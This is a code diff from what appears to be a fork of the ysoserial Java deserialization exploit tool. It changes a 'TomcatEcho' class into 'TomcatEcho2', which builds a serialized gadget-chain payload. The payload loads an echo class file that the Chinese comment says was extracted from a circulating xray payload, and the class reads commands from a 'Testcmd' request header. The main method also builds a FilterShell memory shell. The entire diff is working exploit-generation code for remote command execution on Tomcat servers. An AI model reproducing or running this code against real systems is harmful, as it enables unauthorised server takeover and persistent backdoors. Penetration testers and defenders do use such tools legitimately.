@@ -3,24 +3,25 @@ package ysoserial.payloads.rceecho;
 
 import org.apache.commons.io.IOUtils;
 import ysoserial.Serializer;
+import ysoserial.payloads.CommonsCollections10;
 import ysoserial.payloads.Eval;
 import ysoserial.payloads.RomeTools;
 import ysoserial.payloads.memshell.FilterShell;
+import ysoserial.payloads.util.ClassFiles;
 
 import java.io.InputStream;
 
-// tomcat rce 回显，/?cmd=id
-public class TomcatEcho {
+// tomcat rce 回显，header : Testcmd=id
+public class TomcatEcho2 {
     public static void main(final String[] args) throws Exception {
         Object evil = new FilterShell().getObject(RomeTools.class);
         byte[] ser = Serializer.serialize(evil);
     }
     public Object getObject(Class gadget) throws Exception {
-        InputStream inputStream = TomcatEcho.class.getClassLoader().getResourceAsStream("rce回显/TomcatEchoTypeB-全版本.jsp");
+        InputStream inputStream = TomcatEcho2.class.getClassLoader().getResourceAsStream("rce回显/根据网上流传的xary payload提取的tomcat回显字节码文件.class");
         byte[] bytes = IOUtils.toByteArray(inputStream);
-        String jspcode = new String(bytes);
-        String javacode = Eval.getJavaCodeFromJSP(jspcode);
-        Object o = new Eval().getObject(gadget,javacode);
+        Class c = ClassFiles.bytesAsClass(bytes);
+        Object o = new Eval().getObject(gadget,c);
         return o;
     }
 }
